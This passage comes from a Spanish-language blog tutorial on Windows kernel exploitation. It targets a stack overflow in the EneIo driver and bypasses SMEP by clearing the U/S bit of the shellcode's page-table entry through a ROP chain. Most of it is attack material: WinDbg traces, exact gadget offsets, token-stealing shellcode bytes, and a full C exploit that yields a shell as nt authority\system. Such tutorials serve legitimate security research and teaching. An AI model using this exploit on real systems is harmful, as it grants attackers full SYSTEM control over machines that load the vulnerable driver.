<p class="plain-text">El único byte que se debería mantener constante es el <code class="language-plaintext highlighter-rouge">0x67</code>, si lo convertimos a formato binario podemos saber cuales de los <code class="language-plaintext highlighter-rouge">bits</code> están encendidos o apagados.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> db 0xffffca0129b10f00 L8
ffffca01`29b10f00  67 d8 6c bf 01 00 00 00                          c.l.....

</span><span class="ro">0: kd></span><span class="p"> .formats 0x67
Evaluate expression:
  Hex:     00000000`00000067
  Decimal: 103
  Decimal (unsigned) : 103
  Octal:   0000000000000000000147
  Binary:  00000000 00000000 00000000 00000000 00000000 00000000 00000000 01100111
  Chars:   .......g
  Time:    Wed Dec 31 18:01:43 1969
  Float:   low 1.44334e-043 high 0
  Double:  5.08888e-322

</span><span class="ro">0: kd></span><span class="p"> ? 0x67 ^ (1 << 2)
Evaluate expression: 99 = 00000000`00000063</span>
</code></pre></div></div><br>

<p class="plain-text">De los bits que están prendidos podemos ver al <code class="language-plaintext highlighter-rouge">0</code> que la página está en memoria física, el bit <code class="language-plaintext highlighter-rouge">1</code> controla los permisos de escritura, el bit <code class="language-plaintext highlighter-rouge">5</code> que la página ha sido leída y finalmente el <code class="language-plaintext highlighter-rouge">6</code> que la página ha sido escrita, en realidad solo nos interesa el <code class="language-plaintext highlighter-rouge">2</code>.</p>
<a href="/exploit-development/windows-kernel/stack-overflow/14.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/14.png"></p></div></a>

<p class="plain-text">Si cambiamos el byte de <code class="language-plaintext highlighter-rouge">0x67</code> a <code class="language-plaintext highlighter-rouge">0x63</code> entonces apagaremos el bit <code class="language-plaintext highlighter-rouge">U/S</code> que indica memoria de usuario por lo que en la <code class="language-plaintext highlighter-rouge">PTE</code> estará marcada como memoria de kernel.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> eb 0xffffca0129b10f00 0x63

</span><span class="ro">0: kd></span><span class="p"> !pte poi(rsp)
                                           VA 00000253621e0000
PXE at FFFFCA6532994020    PPE at FFFFCA6532804A68    PDE at FFFFCA650094D880    PTE at FFFFCA0129B10F00
contains 0A000001BB56F867  contains 0A000001BF970867  contains 0A000001BC371867  contains 00000001BF6CD863
pfn 1bb56f    ---DA--UWEV  pfn 1bf970    ---DA--UWEV  pfn 1bc371    ---DA--UWEV  pfn 1bf6cd    ---DA--KWEV</span>
</code></pre></div></div><br>

<p class="plain-text">Para obtener la <code class="language-plaintext highlighter-rouge">PTE</code> de la página donde se encuentra el shellcode podemos usar la función <code class="language-plaintext highlighter-rouge">MiGetPteAddress</code> que se encuentra en el offset <code class="language-plaintext highlighter-rouge">0x298780</code> a partir de <code class="language-plaintext highlighter-rouge">nt</code>.</p>
<a href="/exploit-development/windows-kernel/stack-overflow/13.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/13.png"></p></div></a>

<p class="plain-text">Nuestra cadena <code class="language-plaintext highlighter-rouge">rop</code> inicia guardando en el registro <code class="language-plaintext highlighter-rouge">rcx</code> la dirección de nuestro shellcode para usarlo como argumento, luego llama a la función <code class="language-plaintext highlighter-rouge">MiGetPteAddress</code>, esta devuelve en el registro <code class="language-plaintext highlighter-rouge">rax</code> la dirección de la <code class="language-plaintext highlighter-rouge">PTE</code> de nuestro shellcode.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x2079ac</span><span class="p">;</span><span class="c1"> // pop rcx; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">     // Token Stealing
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x298780</span><span class="p">;</span><span class="c1"> // MiGetPteAddress</span>
</code></pre></div></div><br>

<p class="plain-text">Luego guarda en <code class="language-plaintext highlighter-rouge">rcx</code> el byte con el bit <code class="language-plaintext highlighter-rouge">U/S</code> apagado, finalmente mueve a <code class="language-plaintext highlighter-rouge">[rax]</code> el valor del registro <code class="language-plaintext highlighter-rouge">cl</code> que contiene byte que sobrescribe el <code class="language-plaintext highlighter-rouge">0x67</code> original por <code class="language-plaintext highlighter-rouge">0x63</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x2079ac</span><span class="p">;</span><span class="c1"> // pop rcx; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="mi"> 0x63</span><span class="p">;</span><span class="c1">                  // U/S bit off (2)
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x49cadd</span><span class="p">;</span><span class="c1"> // mov byte ptr [rax], cl; ret;</span>
</code></pre></div></div><br>

<p class="plain-text">Como estamos modificando las tablas de paginación, usaremos el gadget <code class="language-plaintext highlighter-rouge">wbinvd</code> para invalidar las <code class="language-plaintext highlighter-rouge">TLB</code> y carga de nuevo las tablas evitando así un posible <code class="language-plaintext highlighter-rouge">BSOD</code>, finalmente para terminar la cadena <code class="language-plaintext highlighter-rouge">rop</code> simplemente retornaremos al shellcode.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x381b30</span><span class="p">;</span><span class="c1"> // wbinvd; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">     // Token Stealing</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro exploit final se ve de la siguiente manera, a través del Buffer Overflow sobrescribe el stack con una cadena rop que apaga el bit <code class="language-plaintext highlighter-rouge">2</code> de la <code class="language-plaintext highlighter-rouge">PTE</code>, ahora el shellcode se marcará como memoria de kernel y al ejecutarlo no invocará a <code class="language-plaintext highlighter-rouge">SMEP</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>
</span><span class="o">#include </span><span class="s">&ltpsapi.h>

</span><span class="o">#define </span><span class="na">IOCTL_STACK_OVERFLOW</span><span class="mi"> 0x80102040
</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

BYTE</span><span class="p"> tokenStealing[</span><span class="mi">60</span><span class="p">]</span><span class="o"> =</span><span class="p"> {
    </span><span class="mi">0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1"> // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    </span><span class="mi">0x50</span><span class="p">,</span><span class="mi"> 0x5b</span><span class="p">,</span><span class="c1">                                           // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="c1">       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    </span><span class="mi">0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                                           //     jnz .loop                    ; if zf == 0 -> loop
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    </span><span class="mi">0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="c1">                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    </span><span class="mi">0xc3</span><span class="c1">                                                  // ret                              ; return
</span><span class="p">};

</span><span class="na">QWORD GetKernelBase</span><span class="p">() {
    </span><span class="na">LPVOID </span><span class="p">drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> cbNeeded;

    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers), </span><span class="o">&</span><span class="p">cbNeeded);
    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">EneIo"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">LPVOID</span><span class="p"> payload</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 120</span><span class="p">, MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    </span><span class="na">LPVOID</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="o"> sizeof</span><span class="p">(tokenStealing), MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload,</span><span class="mi"> 56</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);
    RtlCopyMemory(shellcode, tokenStealing,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));

    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> GetKernelBase();
    </span><span class="na">QWORD</span><span class="o"> *</span><span class="p">rop </span><span class="o">=</span><span class="p"> (</span><span class="na">QWORD</span><span class="o"> *</span><span class="p">) ((</span><span class="na">QWORD</span><span class="p">) payload </span><span class="o">+ </span><span class="mi">56</span><span class="p">);

    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x2079ac</span><span class="p">;</span><span class="c1"> // pop rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">     // Token Stealing
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x298780</span><span class="p">;</span><span class="c1"> // MiGetPteAddress
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x2079ac</span><span class="p">;</span><span class="c1"> // pop rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="mi"> 0x63;</span><span class="c1">                  // U/S bit off (2)
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x49cadd</span><span class="p">;</span><span class="c1"> // mov byte ptr [rax], cl; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="mi"> 0x381b30</span><span class="p">;</span><span class="c1"> // wbinvd; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">     // Token Stealing
</span><span class="p">
    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload,</span><span class="mi"> 120</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Entonces, ejecutamos el exploit y llegamos al breakpoint, ahora al llegar al <code class="language-plaintext highlighter-rouge">ret</code> vulnerable revisamos el stack y podemos ver que retornará a la cadena <code class="language-plaintext highlighter-rouge">rop</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
ene+0x14b8:
fffff805`5fe014b8 c3              ret

</span><span class="ro">0: kd></span><span class="p"> dqs rsp L8
ffff8b09`b75b17e8  fffff805`5ba079ac nt!KiSetAddressPolicy+0x1c
ffff8b09`b75b17f0  0000022d`67550000
ffff8b09`b75b17f8  fffff805`5ba98780 nt!MiGetPteAddress
ffff8b09`b75b1800  fffff805`5ba079ac nt!KiSetAddressPolicy+0x1c
ffff8b09`b75b1808  00000000`00000063
ffff8b09`b75b1810  fffff805`5bc9cadd nt!KiPrepareFlushParameters+0x10c4b1
ffff8b09`b75b1818  fffff805`5bb81b30 nt!HalpAcpiFlushCache
ffff8b09`b75b1820  0000022d`67550000</span>
</code></pre></div></div><br>

<p class="plain-text">Empezamos a ajecutar el <code class="language-plaintext highlighter-rouge">rop</code>, la primera parte guarda la dirección de shellcode en <code class="language-plaintext highlighter-rouge">rcx</code>, luego empieza a ejecutar la función <code class="language-plaintext highlighter-rouge">MiGetPteAddress</code> dentro del módulo <code class="language-plaintext highlighter-rouge">nt</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> p
nt!KiSetAddressPolicy+0x1c:
fffff805`5ba079ac 59              pop     rcx

</span><span class="ro">0: kd></span><span class="p"> p
nt!KiSetAddressPolicy+0x1d:
fffff805`5ba079ad c3              ret

</span><span class="ro">0: kd></span><span class="p"> u rcx L0xc
0000022d`67550000 65488b142588010000 mov     rdx,qword ptr gs:[188h]
0000022d`67550009 488b82b8000000     mov     rax,qword ptr [rdx+0B8h]
0000022d`67550010 50                 push    rax
0000022d`67550011 5b                 pop     rbx
0000022d`67550012 488b9b48040000     mov     rbx,qword ptr [rbx+448h]
0000022d`67550019 4881eb48040000     sub     rbx,448h
0000022d`67550020 4883bb4004000004   cmp     qword ptr [rbx+440h],4
0000022d`67550028 75e8               jne     0000022d`67550012
0000022d`6755002a 488b8bb8040000     mov     rcx,qword ptr [rbx+4B8h]
0000022d`67550031 80e1f0             and     cl,0F0h
0000022d`67550034 488988b8040000     mov     qword ptr [rax+4B8h],rcx
0000022d`6755003b c3                 ret

</span><span class="ro">0: kd></span><span class="p"> p
nt!MiGetPteAddress:
fffff805`5ba98780 48c1e909        shr     rcx,9</span>
</code></pre></div></div><br>

<p class="plain-text">Al terminar de ejecutar la función y llegar al <code class="language-plaintext highlighter-rouge">ret</code>, en el registro <code class="language-plaintext highlighter-rouge">rax</code> se guardará la dirección de la <code class="language-plaintext highlighter-rouge">PTE</code> del shellcode, podemos comprobarlo usando el comando <code class="language-plaintext highlighter-rouge">!pte</code>, la <code class="language-plaintext highlighter-rouge">PTE</code> por ahora está marcada con <code class="language-plaintext highlighter-rouge">U</code> indicando que es espacio de modo usuario.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> pt
nt!MiGetPteAddress+0x1e:
fffff805`5ba9879e c3              ret

</span><span class="ro">0: kd></span><span class="p"> !pte 0x22d67550000
                                           VA 0000022d67550000
PXE at FFFF88C462311020    PPE at FFFF88C4622045A8    PDE at FFFF88C4408B59D0    PTE at FFFF888116B3AA80
contains 0A000001F9441867  contains 0A000001F9442867  contains 0A000001F9443867  contains 00000001F7D9E867
pfn 1f9441    ---DA--UWEV  pfn 1f9442    ---DA--UWEV  pfn 1f9443    ---DA--UWEV  pfn 1f7d9e    ---DA--UWEV

</span><span class="ro">0: kd></span><span class="p"> db rax L8
ffff8881`16b3aa80  67 e8 d9 f7 01 00 00 00                          g.......</span>
</code></pre></div></div><br>

<p class="plain-text">Si saltamos al último gadget podemos ver 2 cosas interesantes, la primera es que la siguiente instrucción retornará al shellcode y la segunda y más interesante es que ahora la <code class="language-plaintext highlighter-rouge">PTE</code> está marcada con una <code class="language-plaintext highlighter-rouge">K</code> indicando que es memoria de kernel.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g nt + 0x381b30
nt!HalpAcpiFlushCache:
fffff805`5bb81b30 0f09            wbinvd

</span><span class="ro">0: kd></span><span class="p"> u poi(rsp) L0xc
0000022d`67550000 65488b142588010000 mov     rdx,qword ptr gs:[188h]
0000022d`67550009 488b82b8000000     mov     rax,qword ptr [rdx+0B8h]
0000022d`67550010 50                 push    rax
0000022d`67550011 5b                 pop     rbx
0000022d`67550012 488b9b48040000     mov     rbx,qword ptr [rbx+448h]
0000022d`67550019 4881eb48040000     sub     rbx,448h
0000022d`67550020 4883bb4004000004   cmp     qword ptr [rbx+440h],4
0000022d`67550028 75e8               jne     0000022d`67550012
0000022d`6755002a 488b8bb8040000     mov     rcx,qword ptr [rbx+4B8h]
0000022d`67550031 80e1f0             and     cl,0F0h
0000022d`67550034 488988b8040000     mov     qword ptr [rax+4B8h],rcx
0000022d`6755003b c3                 ret

</span><span class="ro">0: kd></span><span class="p"> !pte poi(rsp)
                                           VA 0000022d67550000
PXE at FFFF88C462311020    PPE at FFFF88C4622045A8    PDE at FFFF88C4408B59D0    PTE at FFFF888116B3AA80
contains 0A000001F9441867  contains 0A000001F9442867  contains 0A000001F9443867  contains 00000001F7D9E863
pfn 1f9441    ---DA--UWEV  pfn 1f9442    ---DA--UWEV  pfn 1f9443    ---DA--UWEV  pfn 1f7d9e    ---DA--KWEV</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de ejecutar el shellcode sin errores, retornará a la instrucción dentro de la función <code class="language-plaintext highlighter-rouge">IopSynchronousServiceTail</code> saliendo correctamente de la llamada al driver, esto lo comprobamos ya que si continuamos la ejecución continúa sin corromper.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> p
0000022d`67550000 65488b142588010000 mov   rdx,qword ptr gs:[188h]

</span><span class="ro">0: kd></span><span class="p"> pt
0000022d`6755003b c3              ret

</span><span class="ro">0: kd></span><span class="p"> dqs rsp L1
ffff8b09`b75b1828  fffff805`5be4c801 nt!IopSynchronousServiceTail+0x361

</span><span class="ro">0: kd></span><span class="p"> g
Debuggee is running...</span>
</code></pre></div></div><br>

<p class="plain-text">Solo nos queda probarlo fuera del debugger, al hacerlo podemos ver que hicimos bypass de la protección <code class="language-plaintext highlighter-rouge">SMEP</code> y conseguimos una shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop></span><span class="am"> exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.19045.6456]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>